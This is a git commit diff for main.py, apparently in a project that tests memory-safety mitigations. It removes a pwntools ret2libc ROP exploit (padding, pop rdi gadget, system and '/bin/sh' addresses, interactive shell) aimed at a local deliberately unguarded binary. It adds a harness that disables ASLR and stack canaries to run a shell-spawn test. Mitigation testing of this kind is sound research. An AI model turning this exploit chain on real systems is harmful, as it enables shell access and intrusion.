42b6fe1b0c39d46ba1764d13e2f1a988ac25a334
Eric Zou <ezou626@gmail.com>
2025-04-23 07:56:55 -0400

    main runs a single test

--- main.py
+++ main.py
@@ -1,22 +1,19 @@
-# 64-bit
-from pwn import *
+from models import ConfigAction, ROPTest
+from config import load_protection_config
 
-p = process('./bin/gcc_unguarded')
+from tests import ShellSpawnTest
 
-libc_base = 0x7ffff7dce000             # Set base address
+def main():
+    protections = load_protection_config("actions.yaml")
 
-system = libc_base + 0x4c490            # Grab location of system
-binsh = libc_base + 0x196031
+    binary = "./bin/gcc_wxorx"
 
-POP_RDI = 0x40113a
+    test = ShellSpawnTest(binary)
 
-payload = b'A' * 72         # The padding
-payload += p64(POP_RDI)   # pop rdi; ret
-payload += p64(binsh)      # Location of system
-payload += p64(0x401016)
-payload += p64(system)
-payload += p64(0x0)
+    selected_actions = [protections["disable-aslr"], protections["disable-canary"]]
+    result = test.run_test(selected_actions)
 
-p.clean()
-p.sendline(payload)
-p.interactive()
+    print(result)
+
+if __name__ == "__main__":
+    main()
